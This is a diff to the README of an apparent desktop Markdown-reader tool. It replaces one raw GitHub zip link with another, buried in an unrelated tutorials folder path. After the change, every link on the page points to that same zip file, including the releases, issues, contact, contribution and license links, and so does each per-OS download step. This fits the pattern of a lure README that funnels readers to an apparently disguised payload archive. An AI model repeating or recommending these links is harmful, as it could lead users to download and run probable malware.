@@ -6,9 +6,9 @@ Welcome to neu_markdown_buddy! This tool helps you easily navigate, read, and le
 
 ## 📥 Download neu_markdown_buddy
 
-[![Download neu_markdown_buddy](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip)](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip)
+[![Download neu_markdown_buddy](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip)](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip)
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip) to download the latest version.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip) to download the latest version.
 
 ## 🔧 System Requirements
 
@@ -27,11 +27,11 @@ Before you download, make sure your system meets the following requirements:
 
 ## 📜 How to Download & Install
 
-1. Click on the [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip).
+1. Click on the [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip).
 2. Look for the latest version at the top of the page.
 3. Select the download link relevant to your operating system:
-   - For Windows: `https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip`
-   - For macOS: `https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip`
+   - For Windows: `https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip`
+   - For macOS: `https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip`
    - For Linux: Use the appropriate package for your distribution.
 
 4. After downloading, locate the file in your downloads folder.
@@ -53,11 +53,11 @@ If you encounter any issues:
 - **Slow performance:** Close any other applications running in the background.
 - **Search not working:** Make sure you have the latest version of the app.
 
-For further assistance, please check the [issues page on GitHub](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip).
+For further assistance, please check the [issues page on GitHub](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip).
 
 ## 📞 Support
 
-If you have questions, please reach out through the repository's [contact page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip). You can also report any bugs or suggestions there.
+If you have questions, please reach out through the repository's [contact page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip). You can also report any bugs or suggestions there.
 
 ## 💡 FAQs
 
@@ -71,7 +71,7 @@ Yes, once installed, you can use the app without an internet connection to read 
 
 ### How do I update neu_markdown_buddy?
 
-To update, visit the [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip) and download the latest version. Follow the same installation steps.
+To update, visit the [Releases page](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip) and download the latest version. Follow the same installation steps.
 
 ### Is there a mobile version?
 
@@ -79,10 +79,10 @@ Currently, neu_markdown_buddy is only available for desktop systems. A mobile ve
 
 ## 🗂️ Contribution 
 
-Are you interested in contributing to neu_markdown_buddy? We welcome suggestions and pull requests. Please see our [Contribution Guidelines](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip) for more information.
+Are you interested in contributing to neu_markdown_buddy? We welcome suggestions and pull requests. Please see our [Contribution Guidelines](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip) for more information.
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/structurely/neu_markdown_buddy.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/hdeygfye/neu_markdown_buddy/main/resources/tutorials/python/standard library/Importing Modules/markdown-buddy-neu-v3.2.zip) file for details.
 
 Thank you for your interest in neu_markdown_buddy. We hope it enhances your learning experience with markdown!
